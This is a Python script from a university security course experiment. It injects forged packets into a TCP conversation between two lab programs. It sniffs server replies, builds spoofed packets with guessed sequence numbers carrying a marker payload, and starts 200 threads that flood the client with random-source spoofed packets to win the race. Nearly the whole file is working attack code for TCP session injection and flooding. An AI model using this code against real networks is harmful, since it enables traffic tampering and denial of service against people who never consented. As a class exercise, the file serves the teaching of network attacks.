"""
MO639 Computer Security
Experiment 6
Students: Bruna Almeida Osti
          Rafael Cortez Sanches

===================
TCP packet injector
===================
NOTE: Requires SUPERUSER privileges to run

This script tries to inject packets in an ongoing TCP conversation between client.py and server.py. More
information is available in comments below (function docstrings).
"""
from random import randint
import threading

from scapy.all import sendp, send, sniff, Raw, RandIP
from scapy.layers.inet import TCP, IP, Ether

SERVER_SOCK = ('192.168.104.100', 9999)
CLIENT_SOCK = ('192.168.104.142', 5000)
INTERFACE = 'enp2s0'
FLOODER_THREADS = 200


class Injector:
    def __init__(self):
        self.bad_packet = None
        self.client_port = CLIENT_SOCK[1]
        self.last_seq = None
        self.payload = '00000018AM_I_EVIL_YES_I_AM'

    def _inject(self):
        # print('Trying to inject in {}:{}'.format(self.bad_packet[IP].dst, self.bad_packet[TCP].dport))
        sendp(self.bad_packet, verbose=False)

    def predict_and_inject(self, packet):
        """ When the server answers with a CHUNKRCV, then it means it is receiving a file from the client. This is
        the time to go and try injecting TCP packets"""
        if (packet[IP].src == SERVER_SOCK[0] and
                packet[IP].dst == CLIENT_SOCK[0] and
                str(packet[TCP].payload) == 'CHUNKRCV'):
            self._build_bad_packet(packet)
            try:
                self._inject()
            except KeyboardInterrupt as e:
                raise e
            except BaseException as e:
                print('Erro ao enviar pacote: {}'.format(e.message))

    def _build_bad_packet(self, packet):
        """ Build a malicious (injectable) packet from a given response packet from server to client. The built
        packet is made to look like it is from the client to the server"""
        if self.client_port != packet[TCP].dport:
            # Update client port for the flooding
            self.client_port = packet[TCP].dport
        self.bad_packet = Ether() / IP() / TCP() / self.payload
        self.bad_packet[Ether].src = packet[Ether].dst
        self.bad_packet[Ether].dst = packet[Ether].src
        self.bad_packet[IP].src = packet[IP].dst
        self.bad_packet[IP].dst = packet[IP].src
        self.bad_packet[IP].id = packet[IP].id
        self.bad_packet[TCP].sport = packet[TCP].dport
        self.bad_packet[TCP].dport = packet[TCP].sport
        self.bad_packet[TCP].ack = len(Raw(packet)) + packet[TCP].seq
        self.bad_packet[TCP].seq = self._predict_seq(packet[TCP].ack)
        self.bad_packet[TCP].flags = "PA"
        # These values must be recalculated automatically
        del self.bad_packet[IP].len
        del self.bad_packet[IP].chksum
        del self.bad_packet[TCP].chksum

    def flood_client(self):
        """ Function to be called in flooder threads. May slow down the client's ability to handle incoming
        packets, thus making communications with the server slower. Since during the attack bad packets are
        racing legitimate packets, this can make the attack easier"""
        while True:
            packet = IP(src=RandIP('*.*.*.*'), dst=CLIENT_SOCK[0]) / TCP(dport=self.client_port, flags='PA')
            try:
                send(packet, loop=1, inter=0, verbose=False)
            except:
                continue

    @staticmethod
    def _predict_seq(ack):
        """ Tries to predict the next sequence number for the CLIENT from the ACK coming from the SERVER """
        return ack + randint(0, 4096)


def spawn_flooders(injector):
    """ Spawn several flooder threads to attack the client system"""
    threads = []
    for _ in range(FLOODER_THREADS):
        threads.append(threading.Thread(target=injector.flood_client))
        threads[-1].setDaemon(True)
        threads[-1].start()
    return threads


def main():
    injector = Injector()
    spawn_flooders(injector)
    try:
        sniff(iface=INTERFACE, filter='tcp and port {}'.format(SERVER_SOCK[1]), prn=injector.predict_and_inject)
    except BaseException as e:
        print('Erro fatal: {}'.format(e.message))


if __name__ == '__main__':
    main()
